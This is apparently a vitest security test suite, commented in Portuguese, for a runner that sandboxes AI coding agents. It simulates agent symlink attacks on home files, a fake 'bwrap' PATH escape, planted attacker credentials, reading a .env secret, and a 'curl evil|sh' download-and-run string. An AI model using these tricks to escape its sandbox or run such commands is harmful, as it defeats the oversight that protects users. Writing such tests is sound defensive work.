/**
 * Testes das correções da revisão de segurança do runner (um bloco por problema).
 */
import { spawnSync } from "node:child_process";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";
import { existsSync, lstatSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import type { JobAssignment, RunnerToHub } from "@puxibot/shared";
import { RUNNER_ROOT, setupTestEnv } from "./helpers/env.js";
import { makeAssignment } from "./helpers/fakeHub.js";

const env = setupTestEnv("sec");
const base = path.dirname(env.home);
const { writeSkills } = await import("../src/prompt.js");
const { codexAdapter } = await import("../src/adapters/codex.js");
const { geminiAdapter } = await import("../src/adapters/gemini.js");
const { claudeAdapter, syncClaudeCredentials } = await import("../src/adapters/claude.js");
const { filterConnectorEnv } = await import("../src/adapters/types.js");
const { safeWriteFile, safeRemove, UnsafePathError } = await import("../src/safefs.js");
const { paths } = await import("../src/config.js");
const { childEnv, spawnGroup } = await import("../src/proc.js");
const { bubblewrapArgs, defaultHiddenPaths, detectIsolation, isolate, rejectedExecutables, sandboxEnv } = await import("../src/isolation.js");
const { normalizeHubUrl } = await import("../src/pairing.js");
const { JobManager } = await import("../src/jobs.js");
const { silentLogger } = await import("../src/log.js");

process.env.PUXIBOT_USER_CODEX_HOME = path.join(base, "sem-codex");
process.env.PUXIBOT_USER_GEMINI_HOME = path.join(base, "sem-gemini");

const HAS_BWRAP = process.platform === "linux" && existsSync("/usr/bin/bwrap");
const mcp = { command: "node", args: ["cli.js", "mcp"] };
const mcpProxy = { command: "node", args: ["cli.js", "mcp-proxy"] };
const mcpExec = { command: "node", args: ["cli.js", "mcp-exec"] };

function agentFixture(agentId: string, over: Partial<JobAssignment> = {}) {
  const a = makeAssignment("http://127.0.0.1:9", { ...over, agent: { ...makeAssignment("x").agent, id: agentId } });
  const workdir = paths.agentDir(a.workspace.id, agentId);
  const runDir = paths.runDir(a.jobId);
  mkdirSync(workdir, { recursive: true });
  mkdirSync(runDir, { recursive: true });
  return { a, workdir, runDir };
}

function prepareInput(a: JobAssignment, workdir: string, runDir: string, systemPrompt = "PROMPT DO SISTEMA") {
  return {
    assignment: a,
    workdir,
    runDir,
    systemPrompt,
    userPrompt: "u",
    model: null,
    resumeSessionId: null,
    isolation: "sandbox" as const,
    mcp,
    mcpProxy,
    mcpExec,
    mcpEnv: { PUXIBOT_JOB_TOKEN: "tbj_x" },
    baseEnv: { PATH: process.env.PATH ?? "" },
    binPath: "/bin/true",
  };
}

describe("1. o runner não segue links plantados pelo agente na pasta de trabalho", () => {
  const victim = path.join(base, "vitima");
  mkdirSync(path.join(victim, ".claude", "skills", "pessoal"), { recursive: true });
  writeFileSync(path.join(victim, ".claude", "skills", "pessoal", "SKILL.md"), "skill pessoal");
  writeFileSync(path.join(victim, ".bashrc"), "export PS1=ok\n");
  mkdirSync(path.join(victim, ".gemini"), { recursive: true });
  writeFileSync(path.join(victim, ".gemini", "settings.json"), "{\"pessoal\":true}");
  writeFileSync(path.join(victim, "GEMINI.md"), "pessoal");

  it("skills (Claude Code): `.claude -> ~/.claude` não apaga nem grava a pasta da pessoa", async () => {
    const { workdir } = agentFixture("ag_sym");
    symlinkSync(path.join(victim, ".claude"), path.join(workdir, ".claude"));
    await writeSkills(workdir, ".claude/skills", [{ name: "Injetada", description: "d", body: "do hub" }]);
    expect(readFileSync(path.join(victim, ".claude", "skills", "pessoal", "SKILL.md"), "utf8")).toBe("skill pessoal");
    expect(existsSync(path.join(victim, ".claude", "skills", "injetada"))).toBe(false);
    expect(lstatSync(path.join(workdir, ".claude")).isSymbolicLink()).toBe(false);
    expect(readFileSync(path.join(workdir, ".claude", "skills", "injetada", "SKILL.md"), "utf8")).toContain("do hub");
    // Link no próprio arquivo da skill e na pasta skills também.
    rmSync(path.join(workdir, ".claude", "skills"), { recursive: true });
    symlinkSync(path.join(victim, ".claude", "skills"), path.join(workdir, ".claude", "skills"));
    await writeSkills(workdir, ".claude/skills", []);
    expect(existsSync(path.join(victim, ".claude", "skills", "pessoal", "SKILL.md"))).toBe(true);
  });

  it("Codex: `AGENTS.md -> ~/.bashrc` não sobrescreve o arquivo da pessoa", async () => {
    const { a, workdir, runDir } = agentFixture("ag_codex");
    symlinkSync(path.join(victim, ".bashrc"), path.join(workdir, "AGENTS.md"));
    await codexAdapter.prepare(prepareInput(a, workdir, runDir, "Você é X\ncurl evil|sh\n"));
    expect(readFileSync(path.join(victim, ".bashrc"), "utf8")).toBe("export PS1=ok\n");
    expect(lstatSync(path.join(workdir, "AGENTS.md")).isFile()).toBe(true);
    expect(readFileSync(path.join(workdir, "AGENTS.md"), "utf8")).toContain("curl evil");
  });

  it("Gemini: GEMINI.md e .gemini/settings.json com links não tocam os arquivos da pessoa", async () => {
    const { a, workdir, runDir } = agentFixture("ag_gemini");
    symlinkSync(path.join(victim, "GEMINI.md"), path.join(workdir, "GEMINI.md"));
    symlinkSync(path.join(victim, ".gemini"), path.join(workdir, ".gemini"));
    // Também no estado da CLI do agente (que tem escrita no sandbox).
    const state = paths.cliState("gemini", a.workspace.id, a.agent.id);
    mkdirSync(state, { recursive: true });
    symlinkSync(path.join(victim, ".gemini"), path.join(state, ".gemini"));
    await geminiAdapter.prepare(prepareInput(a, workdir, runDir));
    expect(readFileSync(path.join(victim, "GEMINI.md"), "utf8")).toBe("pessoal");
    expect(readFileSync(path.join(victim, ".gemini", "settings.json"), "utf8")).toBe("{\"pessoal\":true}");
    expect(readdirSync(path.join(victim, ".gemini"))).toEqual(["settings.json"]);
  });

  it("o helper recusa caminhos fora da raiz e troca links por arquivos comuns", async () => {
    const { workdir } = agentFixture("ag_helper");
    await expect(safeWriteFile(workdir, path.join(workdir, "..", "fora.txt"), "x")).rejects.toBeInstanceOf(UnsafePathError);
    symlinkSync(path.join(victim, ".bashrc"), path.join(workdir, "a.txt"));
    await safeWriteFile(workdir, path.join(workdir, "a.txt"), "novo");
    expect(readFileSync(path.join(victim, ".bashrc"), "utf8")).toBe("export PS1=ok\n");
    symlinkSync(victim, path.join(workdir, "pasta"));
    await safeRemove(workdir, path.join(workdir, "pasta", ".bashrc"));
    expect(existsSync(path.join(victim, ".bashrc"))).toBe(true);
    expect(existsSync(path.join(workdir, "pasta"))).toBe(false);
  });
});

describe("2. variáveis de conector não entram no ambiente do isolamento", () => {
  it("nomes perigosos são tirados do ambiente do conector", () => {
    const r = filterConnectorEnv({
      PATH: "/x",
      LD_PRELOAD: "/x.so",
      NODE_OPTIONS: "--require /x",
      HOME: "/x",
      CODEX_HOME: "/x",
      CLAUDE_CONFIG_DIR: "/x",
      GEMINI_CLI_HOME: "/x",
      PUXIBOT_JOB_TOKEN: "x",
      GITHUB_TOKEN: "ok",
    });
    expect(r.env).toEqual({ GITHUB_TOKEN: "ok" });
    expect(r.dropped.sort()).toEqual(["CLAUDE_CONFIG_DIR", "CODEX_HOME", "GEMINI_CLI_HOME", "HOME", "LD_PRELOAD", "NODE_OPTIONS", "PATH", "PUXIBOT_JOB_TOKEN"]);
  });

  it("Codex: o conector vai pelo `puxibot mcp-proxy`; PATH e segredos dele não viram variáveis soltas no ambiente da CLI", async () => {
    const { a, workdir, runDir } = agentFixture("ag_codex_env", {
      connectors: [{ id: "c1", name: "gh", transport: "stdio", command: "/bin/true", args: [], url: null, headers: {}, env: { PATH: "/agente", GITHUB_TOKEN: "s3" }, level: "write" }],
    });
    const p = await codexAdapter.prepare(prepareInput(a, workdir, runDir));
    expect(p.env.PATH).toBe(process.env.PATH);
    expect(p.env.GITHUB_TOKEN).toBeUndefined();
    // A configuração do conector vai inteira numa variável de nome fixo, lida só pelo intermediário
    // (que tira de novo os nomes perigosos antes de iniciar o conector).
    expect(JSON.parse(p.env.PUXIBOT_CONNECTOR_0!)).toMatchObject({ id: "c1", level: "write", command: "/bin/true", env: { GITHUB_TOKEN: "s3" } });
    expect(p.args.join(" ")).toContain('mcp_servers.gh.args=["cli.js", "mcp-proxy", "--config-env", "PUXIBOT_CONNECTOR_0"]');
    expect(p.args.join(" ")).toContain('mcp_servers.gh.env_vars=["PUXIBOT_CONNECTOR_0"]');
  });

  it("`puxibot mcp-exec` inicia o conector com as variáveis dele, sem as perigosas nem o token do job", () => {
    const tsx = pathToFileURL(createRequire(import.meta.url).resolve("tsx")).href;
    const cfg = {
      command: process.execPath,
      args: ["-e", "console.log([process.env.GITHUB_TOKEN, process.env.LD_PRELOAD ?? '-', process.env.PUXIBOT_JOB_TOKEN ?? '-'].join(':'))"],
      env: { GITHUB_TOKEN: "g", LD_PRELOAD: "/nao/existe.so" },
    };
    const r = spawnSync(process.execPath, ["--import", tsx, path.join(RUNNER_ROOT, "src", "cli.ts"), "mcp-exec", "--config-env", "PUXIBOT_CONN_CFG_0"], {
      encoding: "utf8",
      env: { PATH: process.env.PATH ?? "", PUXIBOT_CONN_CFG_0: JSON.stringify(cfg), PUXIBOT_JOB_TOKEN: "tbj_x" },
    });
    expect(r.stdout.trim(), r.stderr).toBe("g:-:-");
  });

  it.runIf(HAS_BWRAP)("o bwrap é iniciado pelo caminho absoluto; um `bwrap` na pasta do agente não roda (antes: fuga do sandbox)", async () => {
    const st = await detectIsolation();
    if (!st.sandbox.available) return;
    const { a, workdir, runDir } = agentFixture("ag_path", {
      connectors: [{ id: "c1", name: "x", transport: "stdio", command: "/bin/true", args: [], url: null, headers: {}, env: {}, level: "write" }],
    });
    a.connectors[0]!.env = { PATH: `${workdir}:/usr/bin:/bin` };
    const pwned = path.join(base, "pwned.txt");
    writeFileSync(path.join(workdir, "bwrap"), `#!/bin/sh\necho fora > ${pwned}\n`, { mode: 0o755 });
    const p = await codexAdapter.prepare(prepareInput(a, workdir, runDir));
    const cmd = await isolate(
      { mode: "sandbox", jobId: a.jobId, command: p.command, args: p.args, env: p.env, workdir, writable: p.writable, readable: p.readable, credentials: p.credentials, executables: ["/bin/true"] },
      {},
      silentLogger,
      st,
    );
    expect(path.isAbsolute(cmd.command)).toBe(true);
    expect(cmd.env.PATH).not.toContain(workdir);
    const proc = spawnGroup({ command: cmd.command, args: cmd.args, env: cmd.env, cwd: cmd.cwd }, () => {}, () => {});
    await proc.exited;
    expect(existsSync(pwned)).toBe(false);
  });
});

describe("3. estado da CLI separado por agente", () => {
  it("cada agente tem o próprio CLAUDE_CONFIG_DIR, e o sandbox de um não libera o do outro", async () => {
    const A = agentFixture("ag_A");
    const B = agentFixture("ag_B");
    const pa = await claudeAdapter.prepare(prepareInput(A.a, A.workdir, A.runDir));
    const pb = await claudeAdapter.prepare(prepareInput(B.a, B.workdir, B.runDir));
    expect(pa.env.CLAUDE_CONFIG_DIR).toBe(paths.cliState("claude", "ws_1", "ag_A"));
    expect(pb.env.CLAUDE_CONFIG_DIR).toBe(paths.cliState("claude", "ws_1", "ag_B"));
    const args = bubblewrapArgs({ mode: "sandbox", jobId: "j", command: "sh", args: [], env: {}, workdir: A.workdir, writable: pa.writable, readable: [], credentials: [] }, {});
    expect(args.join(" ")).toContain(paths.cliState("claude", "ws_1", "ag_A"));
    expect(args.join(" ")).not.toContain("ag_B");
    expect(args.join(" ")).not.toContain(`--bind ${path.join(paths.home(), "cli-state", "claude")} `);
  });
});

describe("4. login da CLI: cópia de volta só com montagem com escrita e formato válido", () => {
  const userDir = path.join(base, "login-pessoa");
  const userFile = path.join(userDir, ".credentials.json");
  const real = JSON.stringify({ claudeAiOauth: { accessToken: "REAL", refreshToken: "REAL", expiresAt: 1000 } });
  const state = paths.cliState("claude", "ws_1", "ag_cred");
  const stateFile = path.join(state, ".credentials.json");
  const plant = (content: string) => {
    rmSync(stateFile, { force: true });
    writeFileSync(stateFile, content);
  };
  const attacker = JSON.stringify({ claudeAiOauth: { accessToken: "ATACANTE", refreshToken: "ATACANTE", expiresAt: 9e15 } });

  it("login montado somente leitura: arquivo do agente é descartado (antes: copiado para o login da pessoa)", async () => {
    mkdirSync(userDir, { recursive: true });
    writeFileSync(userFile, real);
    mkdirSync(state, { recursive: true });
    await syncClaudeCredentials(state, userDir, false);
    expect(lstatSync(stateFile).isSymbolicLink()).toBe(true);
    plant(attacker);
    expect(await syncClaudeCredentials(state, userDir, false)).toBe("discarded");
    expect(readFileSync(userFile, "utf8")).toBe(real);
    expect(lstatSync(stateFile).isSymbolicLink()).toBe(true);
  });

  it("com escrita: JSON inválido ou formato errado também é descartado; login válido e mais novo é copiado", async () => {
    plant("não é json");
    expect(await syncClaudeCredentials(state, userDir, true)).toBe("discarded");
    plant(JSON.stringify({ outra: "coisa" }));
    expect(await syncClaudeCredentials(state, userDir, true)).toBe("discarded");
    expect(readFileSync(userFile, "utf8")).toBe(real);
    const renewed = JSON.stringify({ claudeAiOauth: { accessToken: "NOVO", refreshToken: "NOVO", expiresAt: 5000 } });
    plant(renewed);
    expect(await syncClaudeCredentials(state, userDir, true)).toBe("copied");
    expect(readFileSync(userFile, "utf8")).toBe(renewed);
  });

  it("no adaptador: token longe de vencer = somente leitura e sem cópia de volta no fim", async () => {
    const prev = process.env.PUXIBOT_USER_CLAUDE_DIR;
    process.env.PUXIBOT_USER_CLAUDE_DIR = userDir;
    const fresh = JSON.stringify({ claudeAiOauth: { accessToken: "REAL", refreshToken: "REAL", expiresAt: Date.now() + 48 * 3600_000 } });
    writeFileSync(userFile, fresh);
    try {
      const { a, workdir, runDir } = agentFixture("ag_cred");
      const p = await claudeAdapter.prepare(prepareInput(a, workdir, runDir));
      expect(p.credentials[0]).toMatchObject({ path: userFile, writable: false });
      plant(attacker); // o agente troca o link durante o job
      await p.afterRun!();
      expect(readFileSync(userFile, "utf8")).toBe(fresh);
    } finally {
      process.env.PUXIBOT_USER_CLAUDE_DIR = prev;
    }
  });
});

describe("5. /run/user sempre escondido", () => {
  it("mesmo sem XDG_RUNTIME_DIR", () => {
    const prev = process.env.XDG_RUNTIME_DIR;
    delete process.env.XDG_RUNTIME_DIR;
    try {
      const list = defaultHiddenPaths();
      expect(list).toContain("/run/user");
      if (process.getuid) expect(list).toContain(`/run/user/${process.getuid()}`);
    } finally {
      if (prev !== undefined) process.env.XDG_RUNTIME_DIR = prev;
    }
  });

  it.runIf(HAS_BWRAP && existsSync(`/run/user/${process.getuid?.()}`))("na prática: o D-Bus da sessão não aparece sem XDG_RUNTIME_DIR (antes: fuga por systemd-run --user)", async () => {
    const st = await detectIsolation();
    if (!st.sandbox.available) return;
    const prev = process.env.XDG_RUNTIME_DIR;
    delete process.env.XDG_RUNTIME_DIR;
    try {
      const { workdir } = agentFixture("ag_run");
      const script = `ls -A /run/user/${process.getuid!()} | grep -q . && echo VISIVEL || echo ESCONDIDO`;
      const args = bubblewrapArgs({ mode: "sandbox", jobId: "j", command: "/bin/sh", args: ["-c", script], env: {}, workdir, writable: [], readable: [], credentials: [] }, {});
      const r = spawnSync(st.sandbox.path!, args, { encoding: "utf8", env: sandboxEnv({ PATH: process.env.PATH ?? "" }) });
      expect(r.stdout.trim(), r.stderr).toBe("ESCONDIDO");
    } finally {
      if (prev !== undefined) process.env.XDG_RUNTIME_DIR = prev;
    }
  });
});

describe("6. ambiente da CLI isolada: lista de permitidos", () => {
  const term = { PATH: "/bin", HOME: "/h", LC_ALL: "pt_BR.UTF-8", GH_TOKEN: "ghp_x", AWS_SECRET_ACCESS_KEY: "aws", DATABASE_URL: "pg://", ANTHROPIC_API_KEY: "sk", GEMINI_API_KEY: "g", PUXIBOT_JOB_TOKEN: "tbj", CLAUDECODE: "1" };

  it("só passam as básicas; tokens do terminal ficam de fora", () => {
    expect(childEnv({}, term)).toEqual({ PATH: "/bin", HOME: "/h", LC_ALL: "pt_BR.UTF-8" });
  });

  it("o que o adaptador declara e o env.pass do config.json passam", () => {
    expect(childEnv({ extra: geminiAdapter.authEnv }, term)).toMatchObject({ GEMINI_API_KEY: "g" });
    const e = childEnv({ pass: ["ANTHROPIC_API_KEY", "PUXIBOT_JOB_TOKEN"] }, term);
    expect(e.ANTHROPIC_API_KEY).toBe("sk");
    expect(e.PUXIBOT_JOB_TOKEN).toBeUndefined();
    expect(e.GH_TOKEN).toBeUndefined();
  });
});

describe("7. comando de conector numa pasta escondida não é liberado no sandbox", () => {
  const dir = path.join(os.homedir(), `.puxibot-teste-${process.pid}`, "projeto");
  mkdirSync(path.join(dir, "scripts"), { recursive: true });
  writeFileSync(path.join(dir, "package.json"), "{}");
  writeFileSync(path.join(dir, ".env"), "SEGREDO=1\n");
  writeFileSync(path.join(dir, "scripts", "run.sh"), "#!/bin/sh\n", { mode: 0o755 });
  afterAll(() => rmSync(path.dirname(dir), { recursive: true, force: true }));
  const exe = path.join(dir, "scripts", "run.sh");
  const { workdir } = agentFixture("ag_exe");
  const req = (executables: string[]) => ({ mode: "sandbox" as const, jobId: "j", command: "sh", args: [], env: { PATH: process.env.PATH ?? "" }, workdir, writable: [], readable: [], credentials: [], executables });

  it("recusa o comando (e não monta a pasta do pacote); aceita o que já é visível ou liberado", () => {
    expect(rejectedExecutables(req([exe]), {}).map((r) => r.command)).toEqual([exe]);
    expect(bubblewrapArgs(req([exe]), {}).join(" ")).not.toContain(dir);
    expect(rejectedExecutables(req(["/bin/sh"]), {})).toEqual([]);
    expect(rejectedExecutables(req([exe]), { sandbox: { extraReadOnly: [dir] } })).toEqual([]);
  });

  it.runIf(HAS_BWRAP)("na prática: o agente não lê o .env da pasta do comando (antes: lia)", async () => {
    const st = await detectIsolation();
    if (!st.sandbox.available) return;
    const r = spawnSync(st.sandbox.path!, bubblewrapArgs({ ...req([exe]), command: "/bin/cat", args: [path.join(dir, ".env")] }, {}), { encoding: "utf8" });
    expect(r.stdout).not.toContain("SEGREDO");
  });

  it("o job desliga o conector e avisa", () => {
    const sent: RunnerToHub[] = [];
    const jm = new JobManager({ send: (m) => sent.push(m), capacity: 1, isolation: "sandbox", config: {}, clis: [], logger: silentLogger });
    const a = makeAssignment("http://127.0.0.1:9", {
      connectors: [
        { id: "c1", name: "local", transport: "stdio", command: exe, args: [], url: null, headers: {}, env: { PATH: "/x" }, level: "write" },
        { id: "c2", name: "sistema", transport: "stdio", command: "/bin/sh", args: [], url: null, headers: {}, env: { PATH: "/x", K: "v" }, level: "write" },
      ],
    });
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const out = (jm as any).prepareConnectors({ assignment: a }, "sh", process.env.PATH ?? "") as JobAssignment["connectors"];
    expect(out.map((c) => c.id)).toEqual(["c2"]);
    expect(out[0]!.env).toEqual({ K: "v" });
    const notes = sent.filter((m) => m.type === "job.event").map((m) => (m.type === "job.event" ? m.summary : ""));
    expect(notes.some((s) => /local desligado/.test(s))).toBe(true);
    expect(notes.some((s) => /variáveis ignoradas.*PATH/.test(s))).toBe(true);
  });
});

describe("8. login só com https (exceto hub local)", () => {
  it("recusa http:// fora de localhost", () => {
    expect(() => normalizeHubUrl("http://puxibot.exemplo.com")).toThrow(/https/);
    expect(normalizeHubUrl("puxibot.exemplo.com")).toBe("https://puxibot.exemplo.com");
    expect(normalizeHubUrl("http://localhost:8787")).toBe("http://localhost:8787");
    expect(normalizeHubUrl("http://127.0.0.1:8787/")).toBe("http://127.0.0.1:8787");
    expect(normalizeHubUrl("http://[::1]:8787")).toBe("http://[::1]:8787");
  });
});

describe("9. endereço do hub: vale o do config.json", () => {
  it("ignora o hubUrl do job quando difere do configurado", () => {
    const jm = new JobManager({ send: () => {}, capacity: 1, isolation: "container", config: { hubUrl: "https://hub.exemplo.com" }, clis: [], logger: silentLogger });
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    expect((jm as any).hubUrlFor(makeAssignment("http://127.0.0.1:9"))).toBe("https://hub.exemplo.com");
  });
});

describe("10. roteiros para agentes: arquivo temporário com mktemp", () => {
  it("não usam /tmp/puxibot-login.txt", () => {
    for (const f of ["instalar-hub.md", "ligar-computador.md"]) {
      const text = readFileSync(path.join(RUNNER_ROOT, "..", "..", "docs", "prompts", f), "utf8");
      expect(text).not.toContain("/tmp/puxibot-login.txt");
      expect(text).toContain("mktemp");
    }
  });
});
